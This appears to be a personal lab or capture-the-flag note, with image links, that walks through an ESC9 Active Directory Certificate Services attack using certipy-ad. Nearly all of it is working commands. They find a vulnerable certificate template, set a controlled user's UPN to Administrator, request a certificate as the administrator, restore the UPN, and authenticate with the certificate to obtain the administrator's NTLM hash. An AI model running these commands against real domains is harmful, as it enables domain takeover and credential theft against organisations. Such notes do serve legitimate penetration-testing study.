Check to see if DC is vulnerable to ESC9
![[/image 17 11.png|image 17 11.png]]
- certipy-ad find -dc-ip 10.10.11.41 -vulnerable -stdout <user>@<DOMAIN> -p <pass>
  
![[/image 18 10.png|image 18 10.png]]
- tells you if it’s vulnerable in output
  
also gives you important info like CA name
![[/image 19 9.png|image 19 9.png]]
and users that can use the templates
![[/image 22 7.png|image 22 7.png]]
  
first we need to change the user principal name (UPN) of the user to administrator
![[/image 20 8.png|image 20 8.png]]
- certipy-ad account update -username <user>@<DOMAIN> -password <pass> -user <user> -upn Administrator
    
    - may have to type this one out
    
- this works because the admin user in the domain is “Administrator@<DOMAIN>”, and we’re now just “Administrator”
  
now we can request the template, and get the pfx file for administrator
- certipy-ad req -username <user>@<DOMAIN> -p <pass> -ca <CA_NAME> -template CertifiedAuthentication
    
    - <CA_NAME> found in intial certipy output checking if it’s vulnerable
    
![[/image 21 8.png|image 21 8.png]]
  
Now that we have the administrator.pfx, we should change the upn back to what it was before
- certipy-ad account update -username <user>@<DOMAIN> -password <pass> -user <user> -upn <user>@<DOMAIN>
  
now get the admin NTLM hash
- certipy-ad auth -pfx administrator.pfx -domain <DOMAIN>
![[/image 23 6.png|image 23 6.png]]